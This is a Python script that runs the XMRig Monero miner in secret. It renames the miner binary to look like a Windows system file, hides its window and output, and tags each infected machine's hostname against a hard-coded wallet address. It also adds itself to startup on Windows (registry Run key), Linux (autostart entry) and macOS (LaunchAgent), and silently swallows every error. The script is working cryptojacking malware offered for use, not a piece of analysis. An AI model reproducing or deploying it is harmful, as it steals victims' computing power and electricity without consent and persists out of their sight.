import subprocess
import os
import time
import sys
import json
import socket

# Path to XMRig executable
XMRIG_PATH = "_internal/WINDOWS_RUNTIME_SYS32.exe"  # Replace with the path to your XMRig executable

# Path to config.json
CONFIG_PATH = "_internal/config.json"  # Replace with the path to your config.json

# Your wallet address
WALLET_ADDRESS = "47GRMjq1F8pjX75gnrLtySjNdh6yHRzjN3qjT2L6Vn57AfNz5JFHMedKJkHnFs7vo117gQsG3PUJVdUEWHsfh3XFTkV9m8C"

def generate_worker_name():
    """Generate a worker name using the machine's hostname."""
    hostname = socket.gethostname()  # Get the machine's hostname
    return f"{WALLET_ADDRESS}.{hostname}"

def update_config_with_worker(worker_name):
    """Update the config.json file with the new worker name."""
    try:
        with open(CONFIG_PATH, "r") as f:
            config = json.load(f)

        # Update the worker name in the pool configuration
        config["pools"][0]["user"] = worker_name

        with open(CONFIG_PATH, "w") as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        pass  # Silently handle errors

def start_xmrig():
    """Start XMRig as a subprocess without displaying any output."""
    try:
        # Start XMRig as a subprocess with no console output
        process = subprocess.Popen(
            [XMRIG_PATH, "-c", CONFIG_PATH],
            stdout=subprocess.DEVNULL,  # Suppress stdout
            stderr=subprocess.DEVNULL,  # Suppress stderr
            stdin=subprocess.PIPE,      # Suppress stdin
            creationflags=subprocess.CREATE_NO_WINDOW  # Hide console window (Windows only)
        )
        return process
    except Exception as e:
        return None

def monitor_xmrig(process):
    """Monitor XMRig's output silently."""
    if process:
        try:
            while True:
                if process.poll() is not None:  # Check if the process has ended
                    break
                time.sleep(1)  # Sleep to avoid high CPU usage
        except KeyboardInterrupt:
            pass  # Silently handle keyboard interrupt

def stop_xmrig(process):
    """Stop XMRig silently."""
    if process:
        process.terminate()

def add_to_startup():
    """Add the script to system startup silently."""
    if sys.platform == "win32":
        # Windows
        import winreg
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            # Open the registry key
            reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE)
            
            # Check if the script is already in startup
            try:
                current_value = winreg.QueryValueEx(reg_key, "XMRig")[0]
                if current_value == os.path.abspath(__file__):
                    return  # Already in startup
            except FileNotFoundError:
                pass  # Key doesn't exist, so we'll add it

            # Add the script to startup
            winreg.SetValueEx(reg_key, "XMRig", 0, winreg.REG_SZ, os.path.abspath(__file__))
            winreg.CloseKey(reg_key)
        except Exception as e:
            pass  # Silently handle errors

    elif sys.platform == "linux":
        # Linux
        autostart_dir = os.path.expanduser("~/.config/autostart")
        desktop_file = os.path.join(autostart_dir, "xmrig.desktop")
        try:
            os.makedirs(autostart_dir, exist_ok=True)
            with open(desktop_file, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Exec=python3 {os.path.abspath(__file__)}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=XMRig
Comment=Run XMRig at startup
""")
        except Exception as e:
            pass  # Silently handle errors

    elif sys.platform == "darwin":
        # macOS
        launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
        plist_file = os.path.join(launch_agents_dir, "com.user.xmrig.plist")
        try:
            os.makedirs(launch_agents_dir, exist_ok=True)
            with open(plist_file, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.xmrig</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
        except Exception as e:
            pass  # Silently handle errors

if __name__ == "__main__":
    # Generate a worker name using the machine's hostname
    worker_name = generate_worker_name()

    # Update config.json with the new worker name
    update_config_with_worker(worker_name)

    # Add to startup
    add_to_startup()

    # Start XMRig
    xmrig_process = start_xmrig()

    if xmrig_process:
        # Monitor XMRig output silently
        monitor_xmrig(xmrig_process)

        # Stop XMRig
        stop_xmrig(xmrig_process)